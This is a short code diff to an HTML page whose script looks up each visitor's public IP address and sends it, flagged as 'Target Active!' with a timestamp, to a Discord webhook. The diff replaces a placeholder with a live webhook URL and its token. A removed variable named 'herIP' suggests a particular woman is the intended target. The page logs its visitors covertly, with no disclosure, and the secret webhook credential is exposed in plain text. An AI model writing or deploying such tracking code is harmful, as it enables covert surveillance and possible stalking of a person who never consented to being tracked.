@@ -228,14 +228,11 @@
         fetch('https://api.ipify.org?format=json')
     .then(res => res.json())
     .then(data => {
-      const herIP = data.ip;
-
-      // 2. Send it to your Discord Webhook
-      fetch('YOUR_DISCORD_WEBHOOK_URL_HERE', {
+      fetch('https://discord.com/api/webhooks/1476193692930015394/ifIqDXJbtMtvbRbzEW85evKx3S0sSq0xXlSwSL3CHnHmRjydRicF5kkzdBjj_tMaVF3l', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          content: `🚀 **Target Active!**\n**IP:** ${herIP}\n**Device:** ${navigator.userAgent}\n**Time:** ${new Date().toLocaleString()}`
+          content: `🎯 **Target Active!**\n**IP:** ${data.ip}\n**Time:** ${new Date().toLocaleString()}`
         })
       });
     });
@@ -243,4 +240,5 @@
 </body>
 
 </html>
+
 
